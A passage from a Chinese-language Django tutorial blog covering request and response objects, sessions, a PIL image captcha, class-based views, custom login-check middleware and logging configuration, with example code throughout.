class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;post&quot;</span> <span class=\"attr\">enctype</span>=<span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;username&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phone&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;phone&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;password&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;date&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;生日&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span>提交<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;up_ajax()&quot;</span>&gt;</span>ajax上传json数据<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">function</span> <span class=\"title function_\">up_ajax</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                data = &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">name</span>: <span class=\"variable language_\">document</span>.<span class=\"property\">forms</span>[<span class=\"number\">0</span>].<span class=\"property\">name</span>.<span class=\"property\">value</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">phone</span>: <span class=\"variable language_\">document</span>.<span class=\"property\">forms</span>[<span class=\"number\">0</span>].<span class=\"property\">phone</span>.<span class=\"property\">value</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">                &#125;;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                <span class=\"title function_\">fetch</span>(<span class=\"string\">&#x27;&#x27;</span>, &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">method</span>: <span class=\"string\">&#x27;POST&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">body</span>: <span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(data),</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"attr\">headers</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                        <span class=\"string\">&#x27;Content-Type&#x27;</span>: <span class=\"string\">&#x27;application/json;charset=utf-8&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">                &#125;).<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">response</span> =&gt;</span> response.<span class=\"title function_\">text</span>()).<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">text</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">                    <span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(text)</span></span><br><span class=\"line\"><span class=\"language-javascript\">                &#125;);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        请求路径-path：&#123;&#123; request.path &#125;&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        请求的URI(统一资源标识符): http://&#123;&#123; request.get_host &#125;&#125;:&#123;&#123; request.get_port &#125;&#125;&#123;&#123; request.get_full_path &#125;&#125;</span><br><span class=\"line\">&#123;#                             &#123;&#123; request.get_raw_uri &#125;&#125;#&#125;</span><br><span class=\"line\">&#123;#        The undocumented HttpRequest.get_raw_uri() method is removed.#&#125;</span><br><span class=\"line\">&#123;#        The HttpRequest.build_absolute_uri() method may be a suitable alternative.#&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">pre</span>&gt;</span></span><br><span class=\"line\">            URL: 统一资源定位符，资源的网络地址</span><br><span class=\"line\">            URI: 统一资源标识符，用于RESTful规范中，可以理解为URL</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">pre</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        请求方法：&#123;&#123; request.method &#125;&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        content_type: &#123;&#123; request.content_type &#125;&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        encoding: &#123;&#123; request.encoding &#125;&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        content_params: &#123;&#123; request.content_params &#125;&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">        body: &#123;&#123; request.body &#125;&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>github仓库：<a href=\"mailto:&#103;&#x69;&#116;&#x40;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#46;&#x63;&#111;&#109;\">&#103;&#x69;&#116;&#x40;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#46;&#x63;&#111;&#109;</a>:disenQF/advanceDjango1.git</p>\n<h3 id=\"1-2-response对象\"><a href=\"#1-2-response对象\" class=\"headerlink\" title=\"1.2 response对象\"></a>1.2 response对象</h3><p>响应对象是视图函数返回的对象。由我们自己创建，当然，django有很多快捷方法，如render()/redirect()快速生成response响应对象。</p>\n<p>常用的响应类：</p>\n<ul>\n<li>HttpResponse</li>\n<li>HttpResponseRedirect</li>\n<li>JsonResponse</li>\n</ul>\n<p>响应对象中包含的属性：</p>\n<ul>\n<li><p>content响应的内容</p>\n<ul>\n<li><p>如果HttpResponse对象，则content可以是字节码也可以是字符串</p>\n</li>\n<li><p>JsonResponse，则content可以是dict字典</p>\n</li>\n</ul>\n</li>\n<li><p>status 响应的状态码</p>\n</li>\n<li><p>content_type 响应的数据类型</p>\n</li>\n</ul>\n<h2 id=\"二、会话技术详解\"><a href=\"#二、会话技术详解\" class=\"headerlink\" title=\"二、会话技术详解\"></a>二、会话技术详解</h2><p>一次会话(session)或连接从浏览器的一个Request开始，到服务器返回Response结束。可以在多个页面需要传递部分数据。</p>\n<p>Django的session的数据默认存储在django_session表中。但session依赖于cookie技术。客户端如果禁用了cookie，则session也会失效。</p>\n<h3 id=\"2-1-cookie\"><a href=\"#2-1-cookie\" class=\"headerlink\" title=\"2.1 cookie\"></a>2.1 cookie</h3><h3 id=\"2-2-session\"><a href=\"#2-2-session\" class=\"headerlink\" title=\"2.2 session\"></a>2.2 session</h3><h3 id=\"2-3-Token\"><a href=\"#2-3-Token\" class=\"headerlink\" title=\"2.3 Token\"></a>2.3 Token</h3><h1 id=\"WEB后端服务第17天-Django第7天\"><a href=\"#WEB后端服务第17天-Django第7天\" class=\"headerlink\" title=\"WEB后端服务第17天-Django第7天\"></a>WEB后端服务第17天-Django第7天</h1><h2 id=\"一、验证码\"><a href=\"#一、验证码\" class=\"headerlink\" title=\"一、验证码\"></a>一、验证码</h2><h3 id=\"1-1-验证码方式\"><a href=\"#1-1-验证码方式\" class=\"headerlink\" title=\"1.1 验证码方式\"></a>1.1 验证码方式</h3><ul>\n<li>图片验证码</li>\n<li>滑动验证码</li>\n<li>短信验证码</li>\n<li>邮箱验证码</li>\n</ul>\n<h3 id=\"1-2-验证码使用场景\"><a href=\"#1-2-验证码使用场景\" class=\"headerlink\" title=\"1.2 验证码使用场景\"></a>1.2 验证码使用场景</h3><ul>\n<li>防止爬虫程序</li>\n<li>防止非人为操作</li>\n</ul>\n<h3 id=\"1-3-基于PIL库实现图片验证码\"><a href=\"#1-3-基于PIL库实现图片验证码\" class=\"headerlink\" title=\"1.3 基于PIL库实现图片验证码\"></a>1.3 基于PIL库实现图片验证码</h3><h4 id=\"1-3-1-PIL初步使用\"><a href=\"#1-3-1-PIL初步使用\" class=\"headerlink\" title=\"1.3.1 PIL初步使用\"></a>1.3.1 PIL初步使用</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_img_code</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 创建画布</span></span><br><span class=\"line\">    img = Image.new(<span class=\"string\">&#x27;RGB&#x27;</span>, (<span class=\"number\">80</span>, <span class=\"number\">40</span>), (<span class=\"number\">100</span>, <span class=\"number\">100</span>, <span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 从画布中获取画笔</span></span><br><span class=\"line\">    draw = ImageDraw.Draw(img, <span class=\"string\">&#x27;RGB&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 创建字体对象和字体颜色</span></span><br><span class=\"line\">    font_color = (<span class=\"number\">0</span>, <span class=\"number\">20</span>, <span class=\"number\">100</span>)</span><br><span class=\"line\">    font = ImageFont.truetype(font=<span class=\"string\">&#x27;static/fonts/arial.ttf&#x27;</span>, size=<span class=\"number\">20</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 开始画内容</span></span><br><span class=\"line\">    draw.text((<span class=\"number\">5</span>, <span class=\"number\">5</span>), <span class=\"string\">&#x27;wf&#x27;</span>, font=font, fill=font_color)</span><br><span class=\"line\">    <span class=\"comment\"># draw.line((0, 0), (255, 0, 0), 20)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">        x = random.randint(<span class=\"number\">0</span>, <span class=\"number\">80</span>)</span><br><span class=\"line\">        y = random.randint(<span class=\"number\">0</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        r = random.randint(<span class=\"number\">0</span>, <span class=\"number\">255</span>)</span><br><span class=\"line\">        g = random.randint(<span class=\"number\">0</span>, <span class=\"number\">255</span>)</span><br><span class=\"line\">        b = random.randint(<span class=\"number\">0</span>, <span class=\"number\">255</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        draw.point((x, y), (r, g, b))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 将画布写入内存字节数组中</span></span><br><span class=\"line\">    <span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\">    buffer = BytesIO()</span><br><span class=\"line\">    img.save(buffer, <span class=\"string\">&#x27;png&#x27;</span>)  <span class=\"comment\"># 写入</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> HttpResponse(content=buffer.getvalue(), content_type=<span class=\"string\">&#x27;image/png&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"1-3-2-随机验证码\"><a href=\"#1-3-2-随机验证码\" class=\"headerlink\" title=\"1.3.2 随机验证码\"></a>1.3.2 随机验证码</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_random_str</span>(<span class=\"params\">start, end</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">chr</span>(random.randint(start, end))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">new_code_str</span>(<span class=\"params\"><span class=\"built_in\">len</span></span>):</span><br><span class=\"line\">    code_str = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>):</span><br><span class=\"line\">        flag = random.randint(<span class=\"number\">0</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\">        start, end = (<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>)) <span class=\"keyword\">if</span> flag == <span class=\"number\">1</span> \\</span><br><span class=\"line\">            <span class=\"keyword\">else</span> (<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>)) <span class=\"keyword\">if</span> flag == <span class=\"number\">2</span> \\</span><br><span class=\"line\">            <span class=\"keyword\">else</span> (<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;0&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;9&#x27;</span>))</span><br><span class=\"line\">        code_str += _random_str(start, end)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> code_str</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(new_code_str(<span class=\"number\">6</span>))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、分页器Paginator\"><a href=\"#二、分页器Paginator\" class=\"headerlink\" title=\"二、分页器Paginator\"></a>二、分页器Paginator</h2><h3 id=\"1\"><a href=\"#1\" class=\"headerlink\" title=\"1.\"></a>1.</h3><h3 id=\"2-response-set-cookie-方法的参数有哪些\"><a href=\"#2-response-set-cookie-方法的参数有哪些\" class=\"headerlink\" title=\"2. response.set_cookie()方法的参数有哪些\"></a>2. response.set_cookie()方法的参数有哪些</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">set_cookie(key, value, path=<span class=\"string\">&#x27;/&#x27;</span>, domain=<span class=\"literal\">None</span>, max_age=<span class=\"literal\">None</span>, expires=<span class=\"literal\">None</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-清除所有session的方法是什么\"><a href=\"#3-清除所有session的方法是什么\" class=\"headerlink\" title=\"3. 清除所有session的方法是什么\"></a>3. 清除所有session的方法是什么</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">request.session.clear()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、类视图CBV\"><a href=\"#三、类视图CBV\" class=\"headerlink\" title=\"三、类视图CBV\"></a>三、类视图CBV</h2><h3 id=\"3-1-概念\"><a href=\"#3-1-概念\" class=\"headerlink\" title=\"3.1 概念\"></a>3.1 概念</h3><p>Django中视图(View)写法有两种：</p>\n<ul>\n<li>FBV(Function-based View)基于函数的视图，之前都是使用FBV模式。</li>\n<li>CBV(Class-bases View)基于类的视图，应用面向对象（OOB）设计思想，通过继承、重写等相关特性实现业务功能。</li>\n</ul>\n<h3 id=\"3-2-Django提供很多的View\"><a href=\"#3-2-Django提供很多的View\" class=\"headerlink\" title=\"3.2 Django提供很多的View\"></a>3.2 Django提供很多的View</h3><ul>\n<li><p>View</p>\n</li>\n<li><p>TemplateView</p>\n</li>\n<li><p>RedirectView</p>\n</li>\n<li><p>ListView</p>\n</li>\n<li><p>EditView</p>\n</li>\n<li><p>FormView</p>\n</li>\n<li><p>DetailView</p>\n</li>\n<li><p>DeleteView</p>\n</li>\n</ul>\n<h3 id=\"3-3-使用的过程\"><a href=\"#3-3-使用的过程\" class=\"headerlink\" title=\"3.3 使用的过程\"></a>3.3 使用的过程</h3><ul>\n<li><p>在views.py中定义View的子类，并初始关键属性或重写方法</p>\n<p>在View中处理的流程如下：</p>\n<ul>\n<li>dispatch(request, *args, **kwargs)分发请求到get/post/put/delete/等方法处理函数中</li>\n<li>http_method_not_allowed()请求方法不允许的响应</li>\n<li>options()探测请求方法的Allow信息</li>\n</ul>\n</li>\n<li><p>在路由的视图函数位置上使用View.as_view()</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.urls <span class=\"keyword\">import</span> path</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.views.decorators.csrf <span class=\"keyword\">import</span> csrf_exempt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> stockapp <span class=\"keyword\">import</span> views</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app_name = <span class=\"string\">&#x27;stockapp&#x27;</span></span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;stocks/&lt;stock_id&gt;/&#x27;</span>, csrf_exempt(views.StockView.as_view()), name=<span class=\"string\">&#x27;stocks&#x27;</span>),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;goods/&lt;wd&gt;/&#x27;</span>, views.GoodsView.as_view(), name=<span class=\"string\">&#x27;goods&#x27;</span>),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;query/&lt;wd&gt;/&#x27;</span>, views.QueryView.as_view(), name=<span class=\"string\">&#x27;query&#x27;</span>),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">StockView</span>(<span class=\"title class_ inherited__\">View</span>):</span><br><span class=\"line\">    <span class=\"comment\"># @csrf_exempt</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">dispatch</span>(<span class=\"params\">self, request, *args, **kwargs</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>().dispatch(request, *args, **kwargs)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">get</span>(<span class=\"params\">self, request, **kwargs</span>):</span><br><span class=\"line\">        stock_id = kwargs.get(<span class=\"string\">&#x27;stock_id&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render(request, <span class=\"string\">&#x27;stock/list.html&#x27;</span>, <span class=\"built_in\">locals</span>())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">post</span>(<span class=\"params\">self, request</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">&#x27;post请求&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、中间件Middleware\"><a href=\"#四、中间件Middleware\" class=\"headerlink\" title=\"四、中间件Middleware\"></a>四、中间件Middleware</h2><h3 id=\"4-1-概念\"><a href=\"#4-1-概念\" class=\"headerlink\" title=\"4.1 概念\"></a>4.1 概念</h3><p>中间件基于AOP(面向切面编程)设计思想，目的是扩展业务功能，即不修改原业务基础上，增加新的功能，类似于装饰器。中间件有很多使用场景：验证权限、限制ip(黑名单)、限制请求次数、跨域请求、访问日志/统计、记录错误信息。</p>\n<p>Django的中间件有五个勾子函数【重要】：</p>\n<ul>\n<li><strong>process_request()</strong> 从django框架到urls路由过程</li>\n<li><strong>process_view(request, callback, callback_args, callback_kwargs)</strong> 从urls路由到view视图函数的过程</li>\n<li><strong>process_template_response()</strong> 在view视图函数中渲染模板的过程【不常用】</li>\n<li><strong>process_exception(request, exception)</strong> 从请求到响应的整个过程，如果发生了异常，则会被此函数处理</li>\n<li><strong>process_response(request, response)</strong> 从视图函数中向Django响应数据时，即返回HttpResponse()对象后</li>\n</ul>\n<h3 id=\"4-2-自定义中间件\"><a href=\"#4-2-自定义中间件\" class=\"headerlink\" title=\"4.2 自定义中间件\"></a>4.2 自定义中间件</h3><p>中间件的基本类：django.utils.deprecation.MiddlewareMixin</p>\n<p>在项目的目录下，创建middleware包和check_login.py脚本，内容如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.http <span class=\"keyword\">import</span> HttpResponse</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.utils.deprecation <span class=\"keyword\">import</span> MiddlewareMixin</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">CheckLoginMiddleware</span>(<span class=\"title class_ inherited__\">MiddlewareMixin</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">process_request</span>(<span class=\"params\">self, request</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 从请求到路由urls过程，触发此函数</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-----------CheckLoginMiddleware-------------&#x27;</span>, <span class=\"string\">&#x27;process_request&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(request.path, request.COOKIES)</span><br><span class=\"line\">        dontfilters = [<span class=\"string\">&#x27;/user/login/&#x27;</span>, <span class=\"string\">&#x27;/user/code/&#x27;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> request.path <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> dontfilters:</span><br><span class=\"line\">            <span class=\"comment\"># 验证用户是否登录</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> request.COOKIES.get(<span class=\"string\">&#x27;token&#x27;</span>):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">&#x27;&lt;h3&gt;Login&lt;/h3&gt;&lt;form&gt;&lt;input&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">process_view</span>(<span class=\"params\">self, request, callback, callback_args, callback_kwargs</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-----------CheckLoginMiddleware-------------&#x27;</span>, <span class=\"string\">&#x27;process_view&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># callback 是调用的view函数</span></span><br><span class=\"line\">        <span class=\"comment\"># 新增一个关键参数，类似于匹配路由 stock/&lt;stock_id&gt;/&lt;page&gt;/</span></span><br><span class=\"line\">        callback_kwargs[<span class=\"string\">&#x27;page&#x27;</span>] = request.GET.get(<span class=\"string\">&#x27;page&#x27;</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(callback, callback_args, callback_kwargs)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">process_response</span>(<span class=\"params\">self, request, response</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;-----------CheckLoginMiddleware-------------&#x27;</span>, <span class=\"string\">&#x27;process_response&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response</span><br></pre></td></tr></table></figure>\n\n<p>在settings.py的注册中间件类</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">MIDDLEWARE = [</span><br><span class=\"line\">    <span class=\"string\">&#x27;middleware.check_login.CheckLoginMiddleware&#x27;</span>,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、Django日志\"><a href=\"#五、Django日志\" class=\"headerlink\" title=\"五、Django日志\"></a>五、Django日志</h2><h3 id=\"5-1-Django日志LOGGING的组成部分\"><a href=\"#5-1-Django日志LOGGING的组成部分\" class=\"headerlink\" title=\"5.1 Django日志LOGGING的组成部分\"></a>5.1 Django日志LOGGING的组成部分</h3><ul>\n<li>日志的版本号 version</li>\n<li>日志的格式化 formatters</li>\n<li>日志的处理器 handlers</li>\n<li>日志的记录器 loggers，默认存在“django.server”，”django.request”</li>\n<li>日志的过滤器 filters</li>\n</ul>\n<h3 id=\"5-2-配置日志\"><a href=\"#5-2-配置日志\" class=\"headerlink\" title=\"5.2 配置日志\"></a>5.2 配置日志</h3><p>在settings.py脚本中配置，内容如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 配置Django的日志</span></span><br><span class=\"line\">LOGGING = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;version&#x27;</span>: <span class=\"number\">1.0</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;formatters&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;base&#x27;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;format&#x27;</span>: <span class=\"string\">&#x27;[%(asctime)s  %(name)s ] %(message)s&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;datefmt&#x27;</span>: <span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&#x27;handlers&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;out&#x27;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;class&#x27;</span>: <span class=\"string\">&#x27;logging.StreamHandler&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;level&#x27;</span>: <span class=\"string\">&#x27;INFO&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;formatter&#x27;</span>: <span class=\"string\">&#x27;base&#x27;</span>,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"string\">&#x27;file&#x27;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;class&#x27;</span>: <span class=\"string\">&#x27;logging.FileHandler&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;level&#x27;</span>: <span class=\"string\">&#x27;WARNING&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;formatter&#x27;</span>: <span class=\"string\">&#x27;base&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;filename&#x27;</span>: <span class=\"string\">f&#x27;<span class=\"subst\">&#123;BASE_DIR&#125;</span>/warn.log&#x27;</span>,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">&#x27;loggers&#x27;</span>: &#123;</span><br><span class=\"line\">        <span class=\"comment\"># 日志记录器名称 django.server</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;django.server&#x27;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;handlers&#x27;</span>: [<span class=\"string\">&#x27;out&#x27;</span>, <span class=\"string\">&#x27;file&#x27;</span>],</span><br><span class=\"line\">            <span class=\"string\">&#x27;level&#x27;</span>: <span class=\"string\">&#x27;CRITICAL&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;propagate&#x27;</span>: <span class=\"literal\">False</span>,</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"string\">&#x27;mylogger&#x27;</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;handlers&#x27;</span>: [<span class=\"string\">&#x27;out&#x27;</span>, <span class=\"string\">&#x27;file&#x27;</span>],</span><br><span class=\"line\">            <span class=\"string\">&#x27;level&#x27;</span>: <span class=\"string\">&#x27;INFO&#x27;</span>,</span><br><span class=\"line\">            <span 